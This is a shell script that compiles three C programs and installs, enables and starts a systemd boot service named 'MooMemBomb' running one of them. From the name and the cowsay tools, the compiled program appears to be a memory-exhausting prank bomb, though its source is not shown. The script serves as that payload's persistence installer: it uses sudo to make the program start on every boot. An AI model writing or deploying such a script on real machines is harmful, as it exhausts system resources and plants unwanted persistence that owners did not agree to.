#!/bin/sh

find . -iname "child" -delete
find . -iname "main" -delete
find . -iname "cow" -delete
sudo apt install xcowsay fortune
gcc -o child child.c
gcc -o main main.c
gcc -o cow cow.c

sudo touch /etc/systemd/system/MooMemBomb.service
sudo chmod 644 /etc/systemd/system/MooMemBomb.service

sudo tee /etc/systemd/system/MooMemBomb.service << EOF
[Unit]
Description=MooMemBomb
After=network.target

[Service]
ExecStart=/home/ubuntu/2/main

[Install]
WantedBy=default.target
EOF

sudo systemctl unmask MooMemBomb.service
sudo systemctl daemon-reload
sudo systemctl enable MooMemBomb.service
sudo systemctl start MooMemBomb.service

